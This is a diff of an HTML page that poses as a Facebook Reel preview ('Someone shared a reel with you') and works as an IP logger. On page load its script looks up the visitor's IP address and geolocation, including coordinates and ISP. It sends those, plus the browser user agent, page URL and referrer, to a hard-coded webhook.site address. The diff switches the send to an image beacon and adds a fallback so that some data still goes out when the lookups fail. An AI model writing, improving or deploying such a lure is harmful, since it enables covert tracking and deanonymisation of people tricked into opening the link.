@@ -7,53 +7,58 @@
 <body>
 
 <script>
-// === YOUR WEBHOOK URL (already filled) ===
 const webhook = "https://webhook.site/76d85cc8-aec9-4843-8f6c-48240f40d8f3";
-// ========================================
 
-fetch('https://api.ipify.org?format=json')
-.then(r => r.json())
-.then(ipData => {
-    fetch('https://ipapi.co/' + ipData.ip + '/json/')
+function sendData() {
+  fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
-    .then(info => {
-        const payload = {
+    .then(ipData => {
+      fetch('https://ipapi.co/' + ipData.ip + '/json/')
+        .then(r => r.json())
+        .then(info => {
+          const params = new URLSearchParams({
             timestamp: new Date().toISOString(),
             ip: ipData.ip,
             city: info.city || "Unknown",
             region: info.region || "Unknown",
             country: info.country_name || "Unknown",
             isp: info.org || "N/A",
-            coords: (info.latitude || "N/A") + ", " + (info.longitude || "N/A"),
+            coords: (info.latitude || "N/A") + "," + (info.longitude || "N/A"),
             userAgent: navigator.userAgent,
             clickedUrl: window.location.href,
             referrer: document.referrer || "Direct"
-        };
+          });
 
-        fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload),
-            mode: "no-cors"
-        });
-    });
-});
+          const img = new Image();
+          img.src = webhook + "?" + params.toString();
+        })
+        .catch(() => fallback());
+    })
+    .catch(() => fallback());
+}
+
+function fallback() {
+  const img = new Image();
+  img.src = webhook + "?error=blocked&ua=" + encodeURIComponent(navigator.userAgent) + "&url=" + encodeURIComponent(window.location.href);
+}
+
+sendData();
 </script>
 
-<!-- Facebook Messenger / Reel Preview -->
-<div style="max-width:500px; margin:40px auto; background:#fff; border:1px solid #ddd; border-radius:12px; overflow:hidden; font-family:system-ui, Arial, sans-serif; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
-    <div style="background:#1877f2; color:white; padding:14px 18px; font-size:15px; font-weight:600; text-align:center;">
-        Facebook
-    </div>
-    <div style="padding:25px; background:#f0f2f5; text-align:center; height:290px; display:flex; flex-direction:column; justify-content:center; color:#222;">
-        <div style="font-size:62px; margin-bottom:20px;">▶️</div>
-        <div style="font-size:17px; font-weight:600;">Funny Reel 😂</div>
-        <div style="margin-top:18px; font-size:14px; color:#444;">This video is loading…</div>
-    </div>
-    <div style="padding:18px; color:#1877f2; font-size:15px; text-align:center;">
-        Someone shared a reel with you<br>
-        <span style="font-size:13px; color:#555;">Tap to watch →</span>
-    </div>
+<!-- Realistic Facebook Reel Preview -->
+<div style="max-width:500px; margin:40px auto; background:#ffffff; border:1px solid #ddd; border-radius:12px; overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,0.12); font-family:system-ui,Arial,sans-serif;">
+  <div style="background:#1877f2; color:white; padding:14px 18px; font-size:15px; font-weight:600; text-align:center;">
+    Facebook
+  </div>
+  <div style="padding:25px; background:#f0f2f5; text-align:center; height:290px; display:flex; flex-direction:column; justify-content:center; color:#222;">
+    <div style="font-size:62px; margin-bottom:20px;">▶️</div>
+    <div style="font-size:17px; font-weight:600;">Funny Reel 😂</div>
+    <div style="margin-top:18px; font-size:14px; color:#444;">This video is loading…</div>
+  </div>
+  <div style="padding:18px; color:#1877f2; font-size:15px; text-align:center;">
+    Someone shared a reel with you<br>
+    <span style="font-size:13px; color:#555;">Tap to watch →</span>
+  </div>
 </div>
 
 <script>
